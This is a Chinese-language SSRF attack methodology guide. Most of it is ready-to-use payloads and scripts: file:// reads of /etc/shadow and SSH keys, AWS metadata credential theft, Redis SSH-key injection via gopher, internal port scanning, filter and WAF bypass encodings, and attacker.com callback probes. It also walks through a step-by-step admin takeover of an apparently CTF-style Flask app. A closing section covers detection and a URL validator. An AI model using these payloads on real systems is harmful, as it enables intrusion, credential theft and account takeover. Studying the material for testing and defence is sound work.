# SSRF 未验证 URL 攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

服务器端请求伪造（Server-Side Request Forgery, SSRF）漏洞发生在应用程序接受用户可控的 URL 参数并将其用于发起网络请求时。当 URL 参数未经任何验证直接传递给 HTTP 客户端库时，攻击者可以：

1. **绕过网络访问控制** - 访问仅允许从服务器内部访问的资源（如 localhost、内网服务）
2. **读取本地文件** - 使用 `file://` 协议读取服务器文件系统
3. **访问云服务元数据** - 获取云实例的敏感配置信息
4. **扫描内部网络** - 探测内网服务和开放端口

### 1.2 漏洞本质

SSRF 漏洞的本质是**信任边界违规**：应用程序错误地认为"从服务器发起的请求是可信的"，将用户输入直接传递给网络请求函数，绕过了原本用于保护内部资源的网络访问控制。

### 1.3 常见 SSRF 触发函数

| 语言 | 危险函数 | 支持的协议 |
|------|---------|-----------|
| Python | `urllib.request.urlretrieve()` | http, https, ftp, file |
| Python | `urllib.request.urlopen()` | http, https, ftp, file |
| Python | `requests.get()` | http, https |
| PHP | `file_get_contents()` | http, https, ftp, file, phar |
| PHP | `fopen()` | http, https, ftp, file |
| PHP | `curl_exec()` | http, https, ftp, file, gopher |
| Java | `HttpURLConnection` | http, https |
| Java | `HttpClient.execute()` | http, https |
| Node.js | `http.get()` | http, https |
| Node.js | `axios.get()` | http, https |

---

## 2. 攻击常见于哪些业务场景

### 2.1 文件上传功能

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 头像上传 | 用户通过 URL 上传头像图片 | 后端使用 `urllib.request.urlretrieve()` 下载图片，无 URL 验证 |
| 文件导入 | 从外部 URL 导入 CSV/Excel 文件 | 直接请求用户提供的 URL 获取文件内容 |
| 文档预览 | 预览外部 URL 的 PDF/文档 | 服务器代理请求外部资源进行渲染 |

### 2.2 Webhook 与回调功能

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Webhook 配置 | 用户配置事件通知 URL | 服务器向用户提供的 URL 发送 HTTP 请求 |
| OAuth 回调 | 第三方登录回调 URL | 重定向到用户可控的回调地址 |
| 支付回调 | 支付成功通知 URL | 向外部 URL 发送支付状态通知 |

### 2.3 资源加载与代理

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 图片代理 | 通过服务器加载外部图片 | 代理请求用户指定的图片 URL |
| RSS 订阅 | 订阅外部 RSS 源 | 定期请求用户提供的 RSS 源 URL |
| 链接预览 | 生成分享链接的预览卡片 | 请求外部 URL 获取 Open Graph 元数据 |
| API 网关 | 代理请求到后端服务 | 将用户请求转发到内部 API 端点 |

### 2.4 云环境与容器

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 云元数据访问 | 获取实例配置信息 | 应用可能请求云提供商的元数据服务 |
| 容器内部服务 | Docker 容器间通信 | 容器可访问宿主机或其他容器的服务 |
| Kubernetes API | 集群管理接口 | 未授权的 Kubernetes API 访问 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

识别所有可能接受 URL 的参数：
- 包含 `url`、`uri`、`path`、`endpoint`、`callback`、`webhook`、`redirect`、`fetch`、`download`、`proxy`、`image_url`、`avatar_url` 等关键词的参数
- 看起来像 URL 的参数值（以 `http://` 或 `https://` 开头）

#### 3.1.2 初步探测 Payload

**基础 SSRF 探测：**
```
# 访问公网服务器（带外检测）
http://attacker.com/ssrf-test
http://your-callback-server.com/

# 访问 localhost（绕过访问控制）
http://127.0.0.1/
http://localhost/
http://[::1]/

# 访问内网地址
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/

# 云元数据服务
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

**协议探测：**
```
# file:// 协议（本地文件读取）
file:///etc/passwd
file:///c:/windows/win.ini

# ftp:// 协议
ftp://ftp.example.com/

# gopher:// 协议（部分库支持）
gopher://localhost:6379/_INFO
```

#### 3.1.3 响应分析

| 响应特征 | 可能含义 |
|---------|---------|
| 响应时间明显延长 | 目标主机不存在或端口关闭（超时） |
| 返回 200 OK | 请求成功，可能访问到内部服务 |
| 返回 403/401 | 访问到内部服务但需要认证 |
| 返回 404 | 服务存在但路径不存在 |
| 返回 500 错误 | SSRF 请求失败或被拦截 |
| 无响应/连接重置 | WAF 或防火墙拦截 |

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

**Python:**
```python
# 危险函数搜索
urllib.request.urlopen(
urllib.request.urlretrieve(
requests.get(
requests.post(
httpx.get(
```

**PHP:**
```php
// 危险函数搜索
file_get_contents(
fopen(
curl_exec(
fsockopen(
```

**Java:**
```java
// 危险函数搜索
HttpURLConnection(
HttpClient.execute(
RestTemplate.getForObject(
```

#### 3.2.2 数据流追踪

1. 定位 URL 参数接收点（如 `request.form.get('url')`）
2. 追踪变量传递路径
3. 检查是否存在验证逻辑（允许列表、协议检查、IP 过滤）
4. 确认最终传递给 HTTP 客户端函数的位置

#### 3.2.3 验证逻辑缺陷识别

**常见有缺陷的验证：**
```python
# 缺陷 1: 仅检查 http/https 协议，不验证目标地址
if not url.startswith(('http://', 'https://')):
    raise ValueError('Invalid protocol')
requests.get(url)  # 仍可访问 127.0.0.1

# 缺陷 2: 黑名单过滤可被绕过
blocked = ['localhost', '127.0.0.1']
if any(b in url for b in blocked):
    raise ValueError('Blocked')
requests.get('http://0.0.0.0/')  # 绕过

# 缺陷 3: DNS 重绑定攻击
# 攻击者控制域名，首次解析为合法 IP，二次解析为内网 IP
requests.get('http://attacker-controlled-domain.com/')
```

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 本地服务探测

```bash
# 探测常见本地服务
http://127.0.0.1:22/      # SSH
http://127.0.0.1:80/      # HTTP
http://127.0.0.1:443/     # HTTPS
http://127.0.0.1:3306/    # MySQL
http://127.0.0.1:5432/    # PostgreSQL
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:8080/    # 代理/应用
http://127.0.0.1:9000/    # 应用服务
```

#### 4.1.2 内网扫描

```python
# 内网端口扫描脚本
import requests

TARGET_IP = '192.168.1.1'
PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9000]

for port in PORTS:
    ssrf_url = f'http://{TARGET_IP}:{port}/'
    try:
        response = requests.post('http://target.com/vulnerable',
                                data={'url': ssrf_url},
                                timeout=3)
        if response.status_code == 200:
            print(f'Port {port}: OPEN')
    except:
        print(f'Port {port}: CLOSED/FILTERED')
```

### 4.2 本地文件读取

#### 4.2.1 Linux 系统敏感文件

```bash
# 系统文件
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf

# 应用文件
file:///proc/self/environ          # 环境变量（可能含密钥）
file:///proc/self/cmdline          # 进程命令行
file:///proc/version               # 内核版本

# 用户文件
file:///root/.ssh/id_rsa
file:///home/user/.ssh/id_rsa
file:///var/log/auth.log
```

#### 4.2.2 Windows 系统敏感文件

```bash
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/boot.ini
file:///d:/xampp/apache/conf/httpd.conf
```

### 4.3 云元数据服务访问

#### 4.3.1 AWS EC2

```bash
# IMDSv1（无需认证）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# IMDSv2（需要 Token，SSRF 通常无法获取）
# PUT http://169.254.169.254/latest/api/token
```

#### 4.3.2 GCP

```bash
# 需要 Metadata-Flavor 头（标准 SSRF 无法访问）
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### 4.3.3 Azure

```bash
# 需要 Metadata 头（标准 SSRF 无法访问）
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
```

### 4.4 权限提升攻击链

#### 4.4.1 绕过 IP 基础认证

**场景**: 管理端点限制仅允许 localhost 访问

```bash
# 目标端点：http://127.0.0.1/admin/reset-password?user=admin&pass=newpass
# 直接访问返回 403（IP 检查失败）

# SSRF 利用：
POST /profile
Content-Type: application/x-www-form-urlencoded

profile_picture_url=http://127.0.0.1/admin/reset-password?user=admin&pass=hacked

# 服务器从 localhost 发起请求，通过 IP 检查
# 管理员密码被重置
```

#### 4.4.2 访问内部 API

```bash
# 内部 API 端点（不对外网开放）
http://10.0.0.5:8080/internal/api/users
http://172.16.0.10:9000/admin/config

# SSRF 利用获取敏感数据
POST /api/fetch
{
    "url": "http://10.0.0.5:8080/internal/api/users"
}

# 返回内部 API 数据（用户列表、配置信息等）
```

### 4.5 建立反向 Shell（高级）

#### 4.5.1 通过 Gopher 协议（需要支持）

```bash
# Redis 未授权访问写入 SSH 密钥
gopher://127.0.0.1:6379/_config%20set%20dir%20/root/.ssh/
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20authorized_keys
gopher://127.0.0.1:6379/_set%20key%20%22%5Cn%5Cnssh-rsa%20AAA...%5Cn%5Cn%22
gopher://127.0.0.1:6379/_save
```

#### 4.5.2 通过文件写入

```bash
# 如果应用有文件上传功能，结合 SSRF 写入 WebShell
file:///tmp/malicious.php  # 上传恶意文件
# 然后通过 Web 访问 /uploads/malicious.php 执行命令
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过协议黑名单

**场景**: 应用禁止 `file://`、`gopher://` 等协议

```bash
# 使用 HTTP/HTTPS 协议（通常允许）
http://127.0.0.1/
https://127.0.0.1/

# 使用 FTP 协议（有时被忽略）
ftp://127.0.0.1/

# 使用 data:// 协议（PHP）
data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 5.2 绕过 IP 黑名单

**场景**: 应用黑名单包含 `127.0.0.1`、`localhost`

```bash
# 使用其他 localhost 表示形式
http://0.0.0.0/
http://[::1]/                    # IPv6 回环
http://127.1/                    # 短写形式
http://127.0.1/                  # 短写形式
http://2130706433/               # 十进制 IP (127.0.0.1)
http://0177.0.0.1/               # 八进制 IP

# 使用 DNS 重绑定
# 注册域名解析到 127.0.0.1
http://localhost.attacker.com/

# 使用 URL 编码绕过
http://127.0.0.1%00/
http://127.0.0.1%252f

# 使用重定向绕过
# 在 attacker.com 设置 302 重定向到 127.0.0.1
http://attacker.com/  →  http://127.0.0.1/
```

### 5.3 绕过域名黑名单

**场景**: 应用禁止访问 `localhost`、`internal` 等域名

```bash
# 使用 IP 地址代替域名
http://127.0.0.1/  代替  http://localhost/

# 使用 DNS 记录
# 注册看似合法的域名，实际解析到内网 IP
evil-external-site.com  →  192.168.1.100

# 使用 CNAME 记录
attacker.com CNAME internal.service.local
```

### 5.4 绕过端口限制

**场景**: 应用仅允许标准端口（80、443）

```bash
# 使用 URL 语法绕过
http://127.0.0.1:80@attacker.com:8080/
# 某些解析器会访问 attacker.com:8080

# 利用重定向
# 访问 http://attacker.com:80/ 重定向到 http://127.0.0.1:8080/
```

### 5.5 绕过 WAF/过滤器

**场景**: WAF 检测并拦截 SSRF Payload

```bash
# 双重 URL 编码
http://127.0.0.1/  →  http://127.0.0.1%252f

# 使用 Unicode 字符
http://127.0.0.1/  →  http://127.0.0.1⽀/  # 使用 Unicode 混淆

# 分块传输编码
# 将 Payload 分拆到多个请求块中

# 使用注释字符（某些解析器支持）
http://127.0.0.1/#@attacker.com/
http://127.0.0.1/?@attacker.com/
```

### 5.6 盲注 SSRF 技术

**场景**: 应用不返回 SSRF 响应内容（盲注）

```python
# 时间延迟检测
import requests
import time

targets = [
    'http://127.0.0.1/',
    'http://192.168.1.1/',
    'http://nonexistent.domain/'
]

for url in targets:
    start = time.time()
    try:
        requests.post('http://target.com/vulnerable',
                     data={'url': url},
                     timeout=10)
    except:
        pass
    elapsed = time.time() - start

    if elapsed > 5:
        print(f'{url}: TIMEOUT (可能访问到慢响应服务)')
    else:
        print(f'{url}: FAST (服务不存在或快速拒绝)')

# DNS/HTTP 外带检测
# 请求 attacker.com 并检查 DNS 日志或 HTTP 回调
http://your-callback-server.com/detect?target=internal-service
```

---

## 6. 实战攻击链示例

### 6.1 Flask 应用 SSRF 到 Admin 权限提升

**目标**: Synthwave User Portal 应用

**前置条件**:
- 应用有用户注册功能
- Profile 端点接受 `profile_picture_url` 参数
- 存在 localhost 限制的密码重置端点

**攻击步骤**:

```bash
# 步骤 1: 注册普通用户
curl -X POST http://localhost:37053/register \
  -d "username=attacker&password=pass123&first_name=Test&last_name=User&email=attacker@test.com"

# 步骤 2: 登录获取会话
curl -X POST http://localhost:37053/login \
  -d "username=attacker&password=pass123" \
  -c cookies.txt

# 步骤 3: 利用 SSRF 重置 admin 密码
curl -X POST http://localhost:37053/profile \
  -b cookies.txt \
  -d "first_name=Test&last_name=User&email=test@test.com" \
  -d "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=pwned123"

# 步骤 4: 登出当前用户
curl http://localhost:37053/logout -b cookies.txt

# 步骤 5: 以 admin 身份登录
curl -X POST http://localhost:37053/login \
  -d "username=admin&password=pwned123" \
  -c admin_cookies.txt

# 步骤 6: 访问特权资源
curl http://localhost:37053/profile -b admin_cookies.txt
# 返回包含 FLAG 的管理员页面
```

**预期结果**: 获取管理员权限和敏感数据（FLAG）

### 6.2 云环境 SSRF 到实例凭证窃取

**目标**: AWS EC2 实例上的应用

**攻击步骤**:

```bash
# 步骤 1: 探测云元数据服务
POST /api/fetch
{
    "url": "http://169.254.169.254/latest/meta-data/"
}

# 步骤 2: 获取 IAM 角色信息
POST /api/fetch
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# 步骤 3: 获取临时凭证
POST /api/fetch
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
}

# 返回:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }

# 步骤 4: 使用凭证访问 AWS 服务
aws s3 ls --access-key ASIA... --secret-key ... --session-token ...
```

**预期结果**: 获取 AWS 临时凭证，访问云资源

---

## 7. 检测与防御建议

### 7.1 检测 SSRF 漏洞

**网络层面**:
- 监控应用发起的异常外连请求
- 检测对内部 IP 段（10.0.0.0/8、172.16.0.0/12、192.168.0.0/16）的访问
- 检测对云元数据 IP（169.254.169.254）的访问

**应用层面**:
- 审计所有接受 URL 参数的功能点
- 检查 HTTP 客户端库的调用位置
- 审查 URL 验证逻辑的完整性

### 7.2 防御 SSRF 攻击

**输入验证**:
```python
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """验证 URL 是否安全"""
    parsed = urlparse(url)

    # 协议白名单
    if parsed.scheme not in ['https']:
        return False

    # 域名/IP 验证
    hostname = parsed.hostname
    if not hostname:
        return False

    # 解析并检查 IP
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # 禁止私有地址
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

        # 禁止云元数据
        if str(ip) == '169.254.169.254':
            return False

        return True
    except:
        return False
```

**网络隔离**:
- 将应用部署在独立网络区域
- 使用防火墙限制应用服务器的出站连接
- 禁止应用访问内部敏感服务

**最小权限原则**:
- 应用运行在非 root 用户
- 限制应用对文件系统的访问权限
- 云实例使用最小权限的 IAM 角色

---

## 8. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [AWS SSRF 防护最佳实践](https://docs.aws.amazon.com/security/latest/best-practices/ssrf-protections.html)
- [SSRF 测试 Payload 集合](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
